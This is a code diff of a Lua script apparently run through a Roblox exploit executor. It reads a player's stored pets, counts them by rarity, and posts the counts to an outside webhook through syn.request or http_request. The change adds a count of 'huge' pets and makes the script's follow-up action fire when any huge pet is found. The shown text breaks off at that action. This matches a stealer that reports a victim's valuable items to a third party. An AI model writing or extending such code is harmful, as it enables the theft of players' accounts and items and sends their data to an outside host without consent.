@@ -217,12 +217,16 @@ local SuperBank = Event:InvokeServer(A_1)
 	RareList = {}
 	CommonList = {}
 	
+	HugeList = {}
+	
 	EXCCount = 0
 	MythicCount = 0
 	LegCount = 0
 	EpicCount = 0
 	RareCount = 0
 	CommonCount = 0
+	
+	HugeCount = 0
 	
 	table.foreach(Library.Directory.Pets, function(i, v)
 		if v.rarity == "Exclusive" then
@@ -243,6 +247,9 @@ local SuperBank = Event:InvokeServer(A_1)
 		if v.rarity == "Basic" then
 			table.insert(CommonList, i)
 		end
+		if v.huge then
+			table.insert(HugeList, i)
+		end
 	end)
 	for i, v in pairs(SuperBank[1]["Storage"]["Pets"]) do
 	if table.find(EXCList, v["id"]) then EXCCount+=1 end
@@ -251,6 +258,7 @@ local SuperBank = Event:InvokeServer(A_1)
 	if table.find(EpicList, v["id"]) then EpicCount+=1 end
 	if table.find(RareList, v["id"]) then RareCount+=1 end
 	if table.find(CommonList, v["id"]) then CommonCount+=1 end
+	if table.find(HugeList, v["id"]) then HugeCount+=1 end
 	end
 local YourWebHookHere =  res2[1]
 
@@ -282,7 +290,7 @@ local data = {
 },
 {
 ["name"] = "__Exclusive/Huges__",
-["value"] = EXCCount,
+["value"] = EXCCount.." ("..HugeCount..")",
 ["inline"] = true
 },
 {
@@ -326,7 +334,7 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-if EXCCount >= 1 then
+if HugeCount >= 1 then
 wait(3)
 local A_1 = 
 {
